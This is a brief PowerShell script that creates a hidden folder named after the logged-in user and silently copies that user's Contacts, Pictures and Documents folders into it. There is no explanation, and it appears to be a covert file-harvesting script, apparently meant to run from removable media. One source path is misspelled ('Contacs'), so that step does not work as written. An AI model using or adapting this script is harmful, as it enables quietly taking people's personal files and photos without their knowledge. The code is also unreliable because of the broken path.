$directorio = ".\$env:USERNAME"
$location = "C:\Users\$env:USERNAME"

New-Item -ItemType Directory -Path $directorio  | ForEach-Object {$_.Attributes = 'Hidden' }

Copy-Item  -Path $location\Contacs -Destination $directorio\Contacts -Recurse 
Copy-Item  -Path $location\Pictures  -Destination $directorio\Pictures  -Recurse
Copy-Item  -Path $location\Documents  -Destination $directorio\Documents -Recurse 

exit



